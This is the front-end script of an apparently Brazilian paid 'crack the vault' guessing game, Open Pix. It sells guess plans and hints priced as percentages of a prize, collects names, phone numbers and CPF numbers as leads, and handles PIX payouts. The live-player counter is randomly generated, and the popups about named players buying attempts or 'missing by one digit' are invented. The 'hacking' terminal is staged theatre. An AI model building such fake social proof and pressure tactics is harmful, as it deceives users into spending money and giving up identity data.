const sfx = {
    type: document.getElementById('sfx-type'),
    error: document.getElementById('sfx-error'),
    win: document.getElementById('sfx-win'),
    pop: document.getElementById('sfx-pop')
};
sfx.pop.volume = 0.4;

function play(sound) {
    if (sound) { sound.currentTime = 0; sound.play().catch(() => {}); }
}

// --- MÁSCARAS ---
$(document).ready(() => {
    $('#input-tel').mask('(00) 00000-0000');
    $('#input-cpf').mask('000.000.000-00');
});

// --- DADOS ---
let usuario = JSON.parse(localStorage.getItem('openpix_user')) || null;
let historico = JSON.parse(localStorage.getItem('openpix_history')) || [];
let tokenVitoriaAtual = ""; // Variável para guardar o token se o usuário ganhar

// --- FUNÇÕES DE UI ---
function fecharModal(id) { document.getElementById(id).classList.add('hidden'); }

function abrirDicas() {
    let textoPremio = $('#premio').text().replace('.', '').replace(',', '.');
    let valorPremio = parseFloat(textoPremio);

    let p1 = valorPremio * 0.05; 
    let p2 = valorPremio * 0.15; 
    let p3 = valorPremio * 0.50; 

    $('#val-dica-1').text('R$ ' + p1.toLocaleString('pt-BR', {minimumFractionDigits: 2}));
    $('#val-dica-2').text('R$ ' + p2.toLocaleString('pt-BR', {minimumFractionDigits: 2}));
    $('#val-dica-3').text('R$ ' + p3.toLocaleString('pt-BR', {minimumFractionDigits: 2}));

    $('#btn-dica-1').attr('onclick', `comprarDica(1, ${p1.toFixed(2)}, 'Pista 1 (5%)')`);
    $('#btn-dica-2').attr('onclick', `comprarDica(2, ${p2.toFixed(2)}, 'Pista 2 (15%)')`);
    $('#btn-dica-3').attr('onclick', `comprarDica(3, ${p3.toFixed(2)}, 'Pista 3 (50%)')`);

    document.getElementById('modal-dicas').classList.remove('hidden');
}

function verificarLogin() {
    if (document.getElementById('senha').value.length !== 4) return;
    if (!usuario) document.getElementById('modal-cadastro').classList.remove('hidden');
    else document.getElementById('modal-planos').classList.remove('hidden');
}

function salvarCadastro(e) {
    e.preventDefault();
    usuario = { nome: $('#input-nome').val(), tel: $('#input-tel').val(), cpf: $('#input-cpf').val() };
    localStorage.setItem('openpix_user', JSON.stringify(usuario));
    
    fetch('/salvar-lead', { 
        method: 'POST', 
        headers: {'Content-Type': 'application/json'}, 
        body: JSON.stringify(usuario) 
    });

    fecharModal('modal-cadastro');
    
    if ('speechSynthesis' in window) {
        const speech = new SpeechSynthesisUtterance(`Cadastro confirmado. Bem vindo ao Open Pix.`);
        speech.lang = 'pt-BR';
        window.speechSynthesis.speak(speech);
    }
    document.getElementById('modal-planos').classList.remove('hidden');
}

function selecionarPlano(valor, chances, plano) {
    fecharModal('modal-planos');
    $('#btn-texto').html('<i class="fas fa-circle-notch fa-spin"></i> GERANDO PIX...');
    
    setTimeout(() => {
        fetch('/registrar-venda', { 
            method: 'POST', 
            headers: {'Content-Type': 'application/json'}, 
            body: JSON.stringify({ valor, plano }) 
        });
        iniciarHack();
    }, 1500);
}

async function comprarDica(nivel, valor, plano) {
    fecharModal('modal-dicas');
    if(confirm(`Confirmar investimento de R$ ${valor} para desbloquear o Nível ${nivel}?`)) {
        const res = await fetch('/comprar-dica', { 
            method: 'POST', 
            headers: {'Content-Type': 'application/json'}, 
            body: JSON.stringify({ nivel, valor, plano }) 
        });
        const data = await res.json();
        
        $('#terminal').removeClass('hidden').css('opacity', '1').empty();
        log(`INJETANDO SCRIPT NÍVEL ${nivel}...`, "#eab308");
        await new Promise(r => setTimeout(r, 800));
        log(`ACESSO PARCIAL: [ ${data.dica} ]`, "#fff");
    }
}

// --- LÓGICA DO JOGO ---
async function log(m, c = "#4ade80") {
    play(sfx.type);
    const line = $(`<div class="log-line" style="color:${c}"><i class="fas fa-angle-right"></i> ${m}</div>`);
    $('#terminal').append(line);
    $('#terminal').scrollTop($('#terminal')[0].scrollHeight);
}

async function iniciarHack() {
    const senhaTentativa = $('#senha').val();
    $('#btn-acao').prop('disabled', true);
    $('#terminal').removeClass('hidden').css('opacity', '1').empty();
    
    await log(`Validando credenciais...`);
    await new Promise(r => setTimeout(r, 600));
    await log("Conectando ao cofre digital...");
    await new Promise(r => setTimeout(r, 800));
    await log(`Testando chave: [ ${senhaTentativa} ]`);
    await new Promise(r => setTimeout(r, 1000));

    const res = await fetch('/tentar', { 
        method: 'POST', 
        headers: {'Content-Type': 'application/json'}, 
        body: JSON.stringify({ senha: senhaTentativa }) 
    });
    const data = await res.json();

    historico.push({ senha: senhaTentativa, ganhou: data.ganhou, data: new Date().toLocaleString('pt-BR') });
    localStorage.setItem('openpix_history', JSON.stringify(historico));

    if (data.ganhou) {
        // VITÓRIA
        play(sfx.win);
        tokenVitoriaAtual = data.token; // Salva o token que veio do backend
        
        await log("ACESSO AUTORIZADO! SAQUE LIBERADO.", "#fbbf24");
        
        // Preenche o modal de vitória
        $('#valor-vitoria').text(data.premio.toLocaleString('pt-BR', { minimumFractionDigits: 2 }));
        $('#token-vitoria').text(data.token);
        
        // Abre o modal após 1 segundo
        setTimeout(() => { 
            document.getElementById('modal-vitoria').classList.remove('hidden'); 
        }, 1000);

    } else {
        // DERROTA
        play(sfx.error);
        await log("ERRO: ACESSO NEGADO.", "#ef4444");
        $('body').addClass('shake');
        
        setTimeout(() => {
            $('body').removeClass('shake');
            $('#terminal').css('opacity', '0').addClass('hidden');
            $('#senha').val('').prop('disabled', false).focus();
            $('#btn-acao').prop('disabled', false);
            $('#btn-texto').html('<i class="fas fa-unlock-alt"></i> ABRIR COFRE AGORA'); 
            $('#premio').text(data.novoPremio.toLocaleString('pt-BR', { minimumFractionDigits: 2 }));
        }, 1500);
    }
}

// --- FUNÇÃO PARA SOLICITAR SAQUE ---
async function solicitarSaque() {
    const pix = $('#pix-vitoria').val();
    
    if(!pix) {
        alert("Por favor, informe a chave PIX.");
        return;
    }
    
    const valor = parseFloat($('#valor-vitoria').text().replace('.','').replace(',','.'));
    
    // Envia para o backend
    await fetch('/solicitar-saque', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            token: tokenVitoriaAtual,
            pix: pix,
            nome: usuario.nome,
            cpf: usuario.cpf,
            valor: valor
        })
    });

    // Fecha modal vitória e abre confirmação
    document.getElementById('modal-vitoria').classList.add('hidden');
    document.getElementById('modal-sucesso-saque').classList.remove('hidden');
}

function abrirHistorico() {
    const lista = $('#lista-historico').empty();
    if (!historico.length) {
        lista.html('<p class="text-center text-slate-600 mt-10 text-xs">Seu histórico está vazio.</p>');
    } else {
        historico.slice().reverse().forEach(h => {
            lista.append(`
                <div class="bg-black/40 p-3 rounded-lg border border-slate-700 flex justify-between items-center hover:bg-black/60 transition mb-2">
                    <span class="font-mono text-lg text-white tracking-widest">${h.senha}</span>
                    <span class="text-[9px] font-bold px-2 py-1 rounded ${h.ganhou ? 'bg-green-500/20 text-green-400' : 'bg-red-500/20 text-red-400'}">
                        ${h.ganhou ? 'DESBLOQUEADO' : 'BLOQUEADO'}
                    </span>
                </div>
            `);
        });
    }
    document.getElementById('modal-historico').classList.remove('hidden');
}

// --- SISTEMA DE NOTIFICAÇÕES (COMPETIÇÃO) ---
const contadorEl = document.getElementById('contador-online');
setInterval(() => {
    let atual = parseInt(contadorEl.innerText);
    let variacao = Math.floor(Math.random() * 5) - 2; 
    let novo = atual + variacao;
    if (novo < 80) novo = 80;
    if (novo > 350) novo = 350;
    contadorEl.innerText = novo;
}, 3000);

const nomes = ["Ricardo", "Beatriz", "Fernando", "Juliana", "Roberto", "Camila", "André", "Vanessa", "Diego", "Larissa", "Tiago", "Patrícia"];
const acoes = [
    { titulo: "Nova Compra!", msg: "acabou de comprar 20 tentativas", cor: "text-green-400" },
    { titulo: "Atenção!", msg: "investiu na Pista Nível 1", cor: "text-yellow-400" },
    { titulo: "Quase lá!", msg: "errou por apenas 1 dígito...", cor: "text-red-400" }, 
    { titulo: "Novo Jogador!", msg: "entrou para disputar o prêmio", cor: "text-blue-400" },
    { titulo: "Hacker!", msg: "está usando a Pista Nível 2...", cor: "text-purple-400" }
];

function mostrarNotificacao() {
    const nome = nomes[Math.floor(Math.random() * nomes.length)];
    const sulfixo = Math.floor(Math.random() * 99);
    const acao = acoes[Math.floor(Math.random() * acoes.length)];
    
    $('#notificacao-titulo').text(acao.titulo).attr('class', `font-bold ${acao.cor}`);
    $('#notificacao-msg').text(`${nome}_${sulfixo} ${acao.msg}`);
    
    if (window.innerWidth > 350) {
        const notif = document.getElementById('notificacao-live');
        notif.classList.add('active');
        play(sfx.pop);
        setTimeout(() => { notif.classList.remove('active'); }, 4000);
    }
    let proximoTempo = Math.floor(Math.random() * 7000) + 5000;
    setTimeout(mostrarNotificacao, proximoTempo);
}
setTimeout(mostrarNotificacao, 3000);
